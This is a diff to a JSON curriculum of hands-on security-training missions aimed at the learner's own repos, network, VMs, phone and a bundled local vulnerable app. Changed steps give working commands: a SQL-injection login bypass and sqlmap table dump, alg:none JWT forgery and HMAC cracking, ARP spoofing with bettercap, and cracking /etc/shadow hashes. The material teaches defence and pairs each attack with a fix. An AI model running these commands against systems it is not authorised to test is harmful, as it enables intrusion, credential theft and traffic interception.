@@ -18,6 +18,7 @@
         "resourceAvailable": true,
         "tools": ["gh CLI", "git", "gitleaks", "trufflehog"],
         "steps": [
+          "Install what you're missing: `gh` (github.com/cli/cli — often preinstalled), `gitleaks` (`sudo apt install gitleaks` on Debian/Ubuntu/WSL, `brew install gitleaks` on macOS, or a release from github.com/gitleaks/gitleaks), `trufflehog` (`brew install trufflehog` or the install script at github.com/trufflesecurity/trufflehog). Then `gh auth login` if you haven't already.",
           "List every public repo: `gh repo list <your-username> --limit 200`.",
           "Clone each one locally, then run `gitleaks detect --source . -v` (or `trufflehog git file://.`) to catch secrets committed anywhere in history, even in commits you force-pushed over.",
           "Check who you leaked to the commit log: `git log --all --format='%an <%ae>'` — personal email, machine hostname in commit signatures, etc.",
@@ -52,10 +53,10 @@
         "resourceNote": "Needs a domain you actually registered/control. If you don't have one yet, do a dry run against a GitHub Pages / Vercel preview URL you own instead — the DNS parts stay locked until you own a domain.",
         "tools": ["whois", "dig", "crt.sh", "theHarvester", "Shodan (free tier)"],
         "steps": [
-          "`whois yourdomain.com` — check registrar, expiry date, exposed registrant contact (privacy-guard on?).",
-          "`dig yourdomain.com ANY` / separate A, AAAA, MX, TXT, NS queries — map every record.",
+          "`whois yourdomain.com` (preinstalled on most Linux/WSL distros; `sudo apt install whois` if missing) — check registrar, expiry date, exposed registrant contact (privacy-guard on?).",
+          "Map the records one type at a time: `dig A yourdomain.com`, `dig AAAA yourdomain.com`, `dig MX yourdomain.com`, `dig NS yourdomain.com`. (Skip `dig ANY` — most resolvers now refuse it per RFC 8482 and it'll just come back empty, which looks like a false negative.)",
           "Check SPF/DMARC: `dig TXT yourdomain.com` and `dig TXT _dmarc.yourdomain.com` — missing/weak SPF+DMARC means anyone can spoof email 'from' your domain.",
-          "Subdomain enumeration via certificate transparency: browse crt.sh/?q=%.yourdomain.com — look for forgotten staging/dev subdomains still resolving.",
+          "Subdomain enumeration via certificate transparency: browse `https://crt.sh/?q=%.yourdomain.com` — look for forgotten staging/dev subdomains still resolving.",
           "If you have a public IP behind the domain, look it up on Shodan's free search to see what banners/ports are visible externally.",
           "Write a hardening checklist from what you found (SPF/DMARC/DNSSEC, remove dead subdomains, enable registrar privacy)."
         ],
@@ -122,13 +123,13 @@
         "estMinutes": 60,
         "target": { "type": "bundled-app", "label": "target-range (bundled, local-only)" },
         "resourceAvailable": true,
-        "tools": ["Burp Suite Community / OWASP ZAP", "sqlmap", "browser devtools"],
+        "tools": ["Burp Suite Community / OWASP ZAP", "sqlmap", "curl", "browser devtools"],
         "steps": [
           "Start the range locally: `bun run target-range` (never expose this port beyond localhost).",
-          "Open the login form, intercept the POST request in Burp/ZAP or just try it in the form directly.",
-          "Try a classic auth-bypass payload in the username field: `' OR '1'='1' -- `.",
-          "Confirm you're logged in as the first user in the table without knowing any password.",
-          "Point `sqlmap` at the vulnerable parameter (`sqlmap -u \"http://localhost:4243/login\" --data=\"username=x&password=y\" --batch`) to enumerate the schema and dump the users table.",
+          "The login form posts JSON, so test it with curl first: `curl -X POST http://127.0.0.1:4243/login -H \"content-type: application/json\" -d '{\"username\":\"x\",\"password\":\"y\"}'` — confirm you get a 401.",
+          "Try a classic auth-bypass payload in the username field: `' OR '1'='1' -- `, e.g. `curl -X POST http://127.0.0.1:4243/login -H \"content-type: application/json\" -d '{\"username\":\"admin'\\'' -- \",\"password\":\"x\"}'`.",
+          "Confirm you're logged in as `admin` without knowing the real password (check the returned `user` object).",
+          "Point `sqlmap` at it — since the endpoint expects JSON, pass `--data` as JSON and set the content-type explicitly: `sqlmap -u \"http://127.0.0.1:4243/login\" --data='{\"username\":\"x\",\"password\":\"y\"}' --headers=\"Content-Type: application/json\" --batch` — let it enumerate the schema and dump the users table.",
           "Open `target-range/src/routes/login.ts`, find the string-concatenated query, and rewrite it using a parameterized query. Re-run your bypass — confirm it now fails."
         ],
         "legalBoundaries": [
@@ -182,12 +183,13 @@
         "estMinutes": 45,
         "target": { "type": "bundled-app", "label": "target-range (bundled, local-only)" },
         "resourceAvailable": true,
-        "tools": ["jwt.io / jwt-cli", "curl"],
+        "tools": ["jwt.io / jwt-cli", "curl", "hashcat (optional, for the brute-force path)"],
         "steps": [
-          "Log in as a normal user, grab the JWT from the response/cookie.",
-          "Decode it (base64) and inspect the header/payload — note the `alg` and the `role` claim.",
-          "Try re-encoding the token with `alg: none` and no signature, or brute-force the (deliberately weak) HMAC secret with `hashcat -m 16500 <token> wordlist.txt`.",
-          "Set `role: admin` in the forged payload, hit `/api/admin/users` with it, and confirm access.",
+          "Log in as a normal user (`POST /login`), grab the JWT from the response's `token` field.",
+          "Decode it: split on `.` and base64url-decode the first two parts (or paste it into jwt.io — nothing sensitive here, it's a local practice token). Note the `alg` and the `role` claim.",
+          "Path A — forge `alg: none`: base64url-encode `{\"alg\":\"none\",\"typ\":\"JWT\"}` and a payload of `{\"sub\":\"attacker\",\"role\":\"admin\"}`, join them with `.`, and add a trailing `.` with an empty signature: `<header>.<payload>.`.",
+          "Path B — crack the weak HMAC secret instead: `hashcat -m 16500 -a 0 \"<your-real-token>\" wordlist.txt` (mode 16500 = JWT). It's short and guessable — rockyou.txt may not have it verbatim, so if it doesn't crack in a minute or two, add a handful of obvious weak-secret guesses to a small custom wordlist and retry.",
+          "Set `role: admin` in the forged payload, hit `/api/admin/users` with it (`-H \"Authorization: Bearer <token>\"`), and confirm access.",
           "Fix `target-range/src/lib/jwt.ts`: use a long random secret from an env var, and explicitly allowlist the signing algorithm server-side instead of trusting the token's own `alg` header."
         ],
         "legalBoundaries": [
@@ -252,10 +254,10 @@
         "estMinutes": 45,
         "target": { "type": "home-network", "label": "Your own home LAN / your own PC" },
         "resourceAvailable": true,
-        "tools": ["nmap", "netstat / ss"],
+        "tools": ["nmap (`sudo apt install nmap`)", "netstat / ss"],
         "steps": [
           "Find your LAN range (`ip a`, look at your subnet, e.g. 192.168.1.0/24).",
-          "`nmap -sV -sC 192.168.1.0/24` — service + version detection across the whole subnet.",
+          "`sudo nmap -sV -sC 192.168.1.0/24` — service + version detection across the whole subnet. (`sudo` unlocks the faster SYN scan; without it nmap falls back to a slower full TCP connect scan, which still works.)",
           "For your own machine specifically: `ss -tulpn` (Linux/WSL) to see every listening process and port.",
           "For each open service you don't recognize or need, decide: close it, firewall it, or document why it's intentional.",
           "Write a network map + a 'ports closed' hardening list."
@@ -283,7 +285,7 @@
         "target": { "type": "home-network", "label": "Your own home router / access point" },
         "resourceAvailable": false,
         "resourceNote": "The passive checks (router admin panel review) always work. The active handshake-capture exercise needs a Wi-Fi adapter that supports monitor mode — flag this as a gear purchase if you want the full version.",
-        "tools": ["router admin panel", "aircrack-ng suite (optional, needs monitor-mode adapter)"],
+        "tools": ["router admin panel", "aircrack-ng suite (optional, needs monitor-mode adapter — `sudo apt install aircrack-ng`)"],
         "steps": [
           "Log into your router's admin panel. Confirm encryption is WPA2/WPA3 (never WEP or open).",
           "Check whether WPS is enabled — if so, disable it (WPS PINs are brute-forceable).",
@@ -312,12 +314,13 @@
         "estMinutes": 60,
         "target": { "type": "home-network", "label": "A device you own (e.g. your own phone) on your own LAN" },
         "resourceAvailable": true,
-        "tools": ["bettercap", "Wireshark"],
+        "tools": ["bettercap (`sudo apt install bettercap` or build from bettercap.org)", "Wireshark"],
         "steps": [
-          "On your PC, run `bettercap` on your LAN interface and ARP-spoof only your own second device (phone/tablet you own).",
-          "Capture the traffic with Wireshark while you use a few apps normally on that device.",
-          "Filter for HTTP (not HTTPS) traffic and look for any credentials, tokens, or personal data sent in cleartext.",
-          "Stop the spoof cleanly (`bettercap` restores ARP tables on exit) and confirm your device's connectivity is back to normal.",
+          "Find your device's IP first (Settings → Wi-Fi → your network, on the phone) so you can target only it.",
+          "On your PC: `sudo bettercap -iface <your-interface, e.g. wlan0 or eth0>` to drop into its interactive shell, then inside it: `set arp.spoof.targets <your-phone's-IP>`, `arp.spoof on`, `net.sniff on`.",
+          "Capture the traffic with Wireshark on the same interface while you use a few apps normally on that device.",
+          "Filter for HTTP (not HTTPS) traffic (Wireshark filter: `http`) and look for any credentials, tokens, or personal data sent in cleartext.",
+          "Stop cleanly: `arp.spoof off` then exit bettercap (it restores ARP tables on exit) — confirm your device's connectivity is back to normal.",
           "Write up any cleartext leaks found and recommend TLS/cert pinning fixes for anything you control the code of."
         ],
         "legalBoundaries": [
@@ -352,8 +355,8 @@
         "estMinutes": 45,
         "target": { "type": "vm-lab", "label": "A local VM (VirtualBox/VMware/UTM) or container" },
         "resourceAvailable": false,
-        "resourceNote": "Needs a hypervisor installed (VirtualBox, VMware, or Docker as a lighter alternative). Flagged as a prerequisite setup step for the rest of this rank.",
-        "tools": ["VirtualBox / VMware / UTM", "a Linux ISO (e.g. Debian/Ubuntu minimal)"],
+        "resourceNote": "Needs a hypervisor installed (VirtualBox, VMware, or Docker as a lighter alternative). Flagged as a prerequisite setup step for the rest of this rank. On Windows + WSL2: install VirtualBox (or use Hyper-V, which WSL2 already runs on) on the Windows host itself, not `apt install`-ed inside the WSL shell — VirtualBox doesn't nest cleanly inside a WSL2 Linux environment.",
+        "tools": ["VirtualBox (virtualbox.org, or `sudo apt install virtualbox` on Linux) / VMware / UTM on Apple Silicon", "a Linux ISO (e.g. Debian/Ubuntu minimal, or Ubuntu Server)"],
         "steps": [
           "Install a hypervisor and create a minimal Linux VM with no network bridging beyond NAT (isolated from your LAN).",
           "Take a clean snapshot the moment install finishes, before touching anything.",
@@ -379,10 +382,11 @@
         "target": { "type": "vm-lab", "label": "The VM from Snapshot First" },
         "resourceAvailable": false,
         "resourceNote": "Depends on Snapshot First being done first.",
-        "tools": ["linpeas.sh", "GTFOBins", "sudo"],
+        "tools": ["linpeas.sh (github.com/peass-ng/PEASS-ng/releases)", "GTFOBins (gtfobins.github.io)", "sudo"],
         "steps": [
           "Create a non-root user, then deliberately introduce one misconfiguration: a SUID binary that shouldn't be SUID, a `sudo NOPASSWD` entry for a dangerous binary, or a cron job writable by your low-priv user.",
-          "Log in as the low-priv user and run `linpeas.sh` to enumerate the box the way an attacker would.",
+          "Inside the VM, grab linpeas: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh`.",
+          "Log in as the low-priv user and run `./linpeas.sh` to enumerate the box the way an attacker would.",
           "Use the flagged misconfiguration (cross-reference GTFOBins for the specific binary) to escalate to root.",
           "Write up the exact escalation path, then fix the misconfiguration and confirm the same path no longer works.",
           "Restore the snapshot when done so the VM is clean for the next mission."
@@ -410,11 +414,11 @@
         "target": { "type": "vm-lab", "label": "The VM from Snapshot First" },
         "resourceAvailable": false,
         "resourceNote": "Depends on Snapshot First being done first.",
-        "tools": ["hashcat or John the Ripper", "rockyou.txt (or a similar public wordlist)"],
+        "tools": ["hashcat or John the Ripper (`sudo apt install hashcat john`)", "rockyou.txt (`sudo apt install wordlists` then `gunzip /usr/share/wordlists/rockyou.txt.gz`, or download from a SecLists mirror)"],
         "steps": [
           "Create a handful of test accounts in the VM with a range of passwords: a common weak one, an 8-char 'complex-looking' one, a long random passphrase.",
-          "Export the shadow hashes (`sudo cat /etc/shadow`, your own VM only) for those test accounts.",
-          "Run `hashcat`/`John` against them with a public wordlist + rule set, and time how long each falls (or doesn't, within a reasonable time budget).",
+          "Export the shadow hashes (`sudo cat /etc/shadow`, your own VM only) for those test accounts, then `sudo unshadow /etc/passwd /etc/shadow > hashes.txt`.",
+          "Start with `john hashes.txt --wordlist=rockyou.txt` — it auto-detects whichever crypt format your distro uses (sha512crypt `$6$`, yescrypt `$y$`, etc.), so it just works without you needing to know the algorithm first. If you want hashcat instead, check the `$`-prefixed tag in `/etc/shadow` to pick the right `-m` mode (`$6$` → `-m 1800`, `$y$` → `-m 26600`).",
           "Build a comparison table: password → crack time.",
           "Restore the snapshot afterward."
         ],
@@ -479,10 +483,11 @@
         "target": { "type": "own-phone", "label": "An APK you built, or an app you installed on your own Android device" },
         "resourceAvailable": false,
         "resourceNote": "Android-specific. If you're on iOS-only, the equivalent (class-dump / Frida against an IPA) needs a jailbroken device and is a much higher barrier — treat it as an optional advanced substitute, flagged as a resource gap for now.",
-        "tools": ["jadx", "apktool"],
+        "tools": ["jadx (github.com/skylot/jadx/releases)", "apktool (apktool.org)", "adb (`sudo apt install android-tools-adb` or via Android SDK platform-tools)"],
         "steps": [
-          "Pull the APK (`adb shell pm path <package>` then `adb pull`), or export it from a project you built.",
-          "Decompile with `jadx-gui` and read through for hardcoded API keys, secrets, or internal URLs baked into strings.",
+          "Enable Developer Options + USB debugging on the phone, connect it, confirm `adb devices` sees it.",
+          "Get the APK's on-device path: `adb shell pm path <package>` (prints something like `package:/data/app/.../base.apk`). Pull it: `adb pull /data/app/.../base.apk ./app.apk` — or just export the APK directly if it's a project you built.",
+          "Decompile with `jadx-gui app.apk` and read through for hardcoded API keys, secrets, or internal URLs baked into strings.",
           "Check `AndroidManifest.xml` for exported Activities/Services/Receivers that shouldn't be exported, and any `android:debuggable=\"true\"` left on in a release build.",
           "Check where the app stores data (`/data/data/<package>/`, on a rooted device or emulator) for anything sensitive stored unencrypted.",
           "Write up findings and fixes (move secrets server-side, un-export components that don't need it, encrypt local storage)."
@@ -508,7 +513,7 @@
         "estMinutes": 60,
         "target": { "type": "own-phone", "label": "Your own phone + PC on the same LAN" },
         "resourceAvailable": true,
-        "tools": ["mitmproxy or Burp Suite", "manual CA cert install on the phone"],
+        "tools": ["mitmproxy (`sudo apt install mitmproxy`, or mitmproxy.org) or Burp Suite", "manual CA cert install on the phone"],
         "steps": [
           "Start `mitmproxy` (or Burp's proxy) on your PC, note its LAN IP and port.",
           "On your phone, set the Wi-Fi manual proxy to that IP:port, then install and trust the proxy's CA certificate (needed to see HTTPS traffic in plaintext).",
@@ -549,7 +554,7 @@
         "target": { "type": "self-build", "label": "A Docker Compose stack you design yourself" },
         "resourceAvailable": false,
         "resourceNote": "Not bundled in Apihack v1 — this is intentionally left to you to build, reusing the vulnerability patterns from Silver (web) and Platinum (privesc). This mission ships as a brief + grading checklist; the target stack itself is on you.",
-        "tools": ["Docker / Docker Compose", "patterns from Silver + Platinum"],
+        "tools": ["Docker / Docker Compose (docs.docker.com/engine/install — Docker Desktop handles both on Windows/WSL2 and macOS)", "patterns from Silver + Platinum"],
         "steps": [
           "Design 3 layers: an internet-facing web app with one real bug (from Silver's playbook), an internal-only admin API that's only reachable after the first foothold, and a DB/host layer that needs a privesc-style bug (from Platinum's playbook) to fully compromise.",
           "Build it in Docker Compose so it's disposable and resettable (`docker compose down -v && docker compose up` = clean slate).",
